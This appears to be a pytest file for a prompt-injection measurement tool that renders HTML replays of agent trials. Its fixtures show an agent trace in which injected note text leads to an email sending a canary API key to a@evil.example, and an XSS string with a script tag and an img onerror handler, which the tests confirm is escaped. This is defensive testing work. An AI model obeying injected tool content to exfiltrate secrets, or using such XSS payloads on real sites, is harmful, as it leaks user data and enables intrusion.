import io
import json

from taintline.demo import run_demo
from taintline.report.replay import suite_html, write_replay

CANARY = "sk-live-CANARYabc123"
EVIL = "<script>alert(1)</script><img src=x onerror=alert(2)>"


def _trial(arrived=False, contact=False, error=None, seed=1, extra=""):
    return {"seed": seed, "error": error, "canary": CANARY, "canary_arrived": arrived, "sink_contact": contact,
            "answer": f"done {extra}",
            "trace": [{"tool": "read_note", "args": {"name": "todo"}, "result": f"buy milk PAYLOAD {extra}"},
                      {"tool": "send_email", "args": {"to": "a@evil.example", "body": CANARY if arrived else "x"},
                       "result": "sent"}]}


def _suite(trials, base=None):
    return {"kind": "live_suite", "lab": None, "pairs": [{"attack": "atk", "task": "t1", "trials": trials}],
            "baseline": [{"task": "t1", "trials": base or [_trial()]}],
            "overall": {"trials": len(trials), "delivered": sum(t["canary_arrived"] for t in trials), "errors": 0},
            "summary": {"baseline_false_alarm": 0.0}}


def test_attacker_text_in_a_trace_is_escaped_and_the_page_has_no_scripts():
    page = suite_html(_suite([_trial(arrived=True, extra=EVIL)]), {"atk": "PAYLOAD"})
    assert "<script" not in page and "<img" not in page        # tags arrive only as escaped text
    assert "&lt;script&gt;" in page and "&lt;img src=x onerror" in page
    assert "default-src &#x27;none&#x27;" in page or "default-src 'none'" in page


def test_the_leak_step_and_the_injected_text_are_marked():
    page = suite_html(_suite([_trial(arrived=True)]), {"atk": "PAYLOAD"})
    assert '<span class="injected">PAYLOAD</span>' in page
    assert f'<mark class="canary">{CANARY}</mark>' in page
    assert "The secret leaves here" in page and "Secret leaked" in page


def test_errors_are_never_shown_as_clean():
    page = suite_html(_suite([_trial(error="timed out")]))
    assert "never as secure" in page and "Nothing left" not in page.split("Baseline")[0]


def test_leaks_are_capped_and_counted():
    page = suite_html(_suite([_trial(arrived=True, seed=i) for i in range(30)]), cap=25)
    assert "showing 25 of 30" in page


def test_demo_writes_a_replay(tmp_path):
    res = run_demo(str(tmp_path), stream=io.StringIO())
    page = (tmp_path / "replay.html").read_text()
    assert "Taintline demo replay" in page and res["scenes"][1]["canary"] in page
    assert json.loads((tmp_path / "demo.json").read_text())["scenes"][0]["prompt"]


def test_write_replay_accepts_a_suite_result(tmp_path):
    out = write_replay(_suite([_trial(arrived=True)]), tmp_path / "r.html")
    assert out.read_text().startswith("<!doctype html>")
